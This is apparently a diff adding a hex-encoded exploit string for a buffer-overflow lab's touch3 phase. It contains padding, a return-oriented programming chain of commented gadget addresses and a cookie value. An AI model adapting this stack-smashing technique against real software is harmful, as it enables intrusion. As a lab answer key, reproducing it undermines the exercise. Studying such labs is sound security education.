@@ -1,0 +1,17 @@
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff 
+ff ff ff ff ff ff ff ff
+
+b3 1a 40 00 00 00 00 00     //rax=rsp
+40 1a 40 00 00 00 00 00     //rdi=rax
+2b 1a 40 00 00 00 00 00     //rax=some const
+48 00 00 00 00 00 00 00     //some const
+06 1b 40 00 00 00 00 00     //edx=eax
+ba 1a 40 00 00 00 00 00     //ecx=edx
+9f 1a 40 00 00 00 00 00     //esi=ecx
+
+5f 1a 40 00 00 00 00 00     //rax=rsi+rdi
+40 1a 40 00 00 00 00 00     //rdi=rax
+
+85 19 40 00 00 00 00 00     //touch3
+33 65 65 64 33 65 33 32 0a  //cookiestring
